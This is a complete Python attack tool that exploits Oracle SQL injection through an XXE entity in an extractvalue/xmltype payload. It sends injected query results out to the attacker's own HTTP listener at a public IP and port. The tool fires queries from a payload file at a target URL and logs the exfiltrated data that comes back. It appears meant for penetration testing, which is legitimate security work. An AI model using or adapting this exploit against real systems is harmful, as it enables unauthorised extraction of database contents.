#!/usr/bin/python3
"""
Use: 
./oracle-xxe-sqli.py [options] <url>
"""
from ipaddress import ip_address
from requests import get
from random import randint
from urllib.parse import urlparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote_plus
from os.path import exists
import argparse
import socket
import threading
import json


__author__= "Daniel Cuesta Suárez - S2Grupo. @danielcues"

ENDCOLOR = '\033[0m'
TEST_NAME_MARKER = "$NAME_HERE$"
TEST_INJECTION_MARKER = "$INJECT_HERE$"
URL_INJECTION_MARKER = "*"
IP_MARKER = "$IP$"
PORT_MARKER = "$PORT$"

server_thread = executor = None
url = urlSplitted = ip = custom_headers = ""
port = 0
server_disabled=False
payload_file = "payloads.lst"



extractvalue= "select+extractvalue(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+exfiltrate+SYSTEM+\"http%3a//" +IP_MARKER+":"+PORT_MARKER+"/query%3ftest%3d"+TEST_NAME_MARKER+"%26result%3d'||(" +TEST_INJECTION_MARKER+ ")||'\">+%25exfiltrate%3b+%25param]>'),NULL)+from+dual"

class levels:
    INFO 	= '\033[94m'
    WARNING 	= '\033[93m'
    OK 		= '\033[92m'
    ERROR 	= '\033[91m'

def log(string, level):
	print ('['+level+'+'+ENDCOLOR+'] '+string)
	return

def getPublicIP():
	try:
		ip = get('https://api.ipify.org').text
	except:	
		ip = None
		
	return  ip

def getRandomPort():
	port = randint(10000, 20000)
	return  port

class Executor:
	def __init__(self):
		return
	def sendPayload(self,payload):
		injector = extractvalue.replace(IP_MARKER,str(ip)).replace(PORT_MARKER,str(port))
		(key, value) = payload.split("\t")
		payload_ready=injector.replace(TEST_INJECTION_MARKER,quote_plus(value)).replace(TEST_NAME_MARKER,quote_plus(key))
		url_ready=url.replace(URL_INJECTION_MARKER, payload_ready)
		log("Sending payload: %s (%s)" % (key, value), levels.INFO)
		try:
			get(url_ready,headers=custom_headers).text
		except:
			log("Can't connect to host",levels.ERROR)
	def doExecute(self):
		try:
			with open(payload_file) as f:
				for payload in [item.strip() for item in f]:
					self.sendPayload(payload)
		except IOError:
			log("Cannot read file %s" % payload_file ,levels.error)
			exit()
	
					

class CustomHandler(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.end_headers()
	def do_GET(self):
		self._set_headers()
		url_arguments = urlparse(self.path).query
		try:
			arguments = dict(arg.split("=") for arg in url_arguments.split('&'))
			test = arguments["test"]
			result = arguments["result"]
			if(test is not None and result is not None):
				log("%s: %s" % (test,result),levels.OK)
		except:
			#Random request bugging the server out
			pass
	
def startServer():
	global server_thread
	server = ('', port)
	httpd = HTTPServer(server, CustomHandler)
	log('Starting httpd...',levels.INFO)
	server_thread = threading.Thread(target = httpd.serve_forever)
	server_thread.start()
	return

def startTesting():
	executor.doExecute()	
	return




def initProgram():
	"""Parses the program arguments and stores them accordingly"""
	global url, urlSplitted, ip, port, server_disabled, custom_headers,payload_file

	parser = argparse.ArgumentParser(description='Options',
					 formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	parser.add_argument("url", 
			    help="URL to test injection. Use %s as the injection marker, just once." % URL_INJECTION_MARKER)
	parser.add_argument("-i","--ip", 
			    help="Public ip. Useful for port forwardings. Default is this machine ip.",
			    type=ip_address,
			    default=getPublicIP())
	parser.add_argument("-p","--port", 
			    help="Port to use. Default will be chosen at random between 10000 and 20000.",
			    type=int,
			    default=getRandomPort())
	parser.add_argument("--disable-server", 
			    help="Don't start server",
			    action='store_true')
	parser.add_argument("--custom-headers", 
			    help="Pass a json dictionary with the custom headers.",
			    type=json.loads)
	parser.add_argument("-f","--payload-file", 
			    help="File to extract the SQL queries from",
			    default=payload_file)

	args= parser.parse_args()

	port = args.port
	ip = args.ip
	if (ip is None):
		log("Can't get a public IP, check your connection or proxy settings", levels.ERROR)
		exit()
	log('Using %s as public IP address and %d as port number' % (ip,port), levels.INFO)

	server_disabled = args.disable_server
	if(server_disabled):
		log("Server is disabled",levels.WARNING)

	url = args.url
	if (url.count('*') is not 1):
		log("URL must contain one and only one *", levels.ERROR)
		exit()
	log('URL to test: %s' % url, levels.INFO)

	custom_headers = args.custom_headers
	if(custom_headers is not None):
		log('Custom Headers: %s' % custom_headers, levels.INFO)
	
	payload_file=args.payload_file
	if exists(payload_file):
		log('Using file %s as payload source' % payload_file,levels.INFO)
	else:	
		log('File %s does not exist. Set a different one or create it' % payload_file,levels.ERROR)
		exit()
	urlSplitted = url.split(URL_INJECTION_MARKER)
	log('Upcomming tests will be injected: %s-->HERE<--%s' % (urlSplitted[0]+levels.OK, ENDCOLOR + urlSplitted[1]),levels.INFO)
	



def main():
	initProgram()
	global executor
	executor = Executor()
	if(not server_disabled):
		startServer()
	startTesting()
	if(not server_disabled):
		server_thread.join()
	return


if __name__ == '__main__':
	main()



